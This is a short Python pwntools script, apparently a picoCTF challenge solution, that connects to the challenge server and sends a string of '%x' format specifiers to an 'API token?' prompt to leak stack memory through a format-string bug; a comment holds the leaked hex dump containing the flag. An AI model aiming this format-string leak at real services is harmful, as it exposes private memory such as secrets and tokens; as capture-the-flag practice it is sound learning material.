from pwn import *

# open remote connection
r = remote('mercury.picoctf.net', '6989')

# get to vulnerability
r.recvuntil(b'View my portfolio\n')
r.send('1\n')
r.recvuntil(b'API token?\n')

# print stack
r.send('%x'*50 + '\n')
x = r.recvuntil(b'Goodbye!\n')

print(99999999999999999999)
print(x)
print(99999999999999999999)


# 86d43f0804b00080489c3f7f81d80ffffffff186d2160f7f8f110f7f81dc7086d3180186d43d086d43f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3538613032356533fff8007df7fbcaf8f7f8f44021eb460010f7e1ece9f7f900c0f7f815c0f7f81000fff878f8f7e0f68df7f815c08048ecafff879040f7fa3f09804b000f7f81000f7f81e20fff87938f7fa9d50f7f8289021eb4600f7f81000804b000fff87938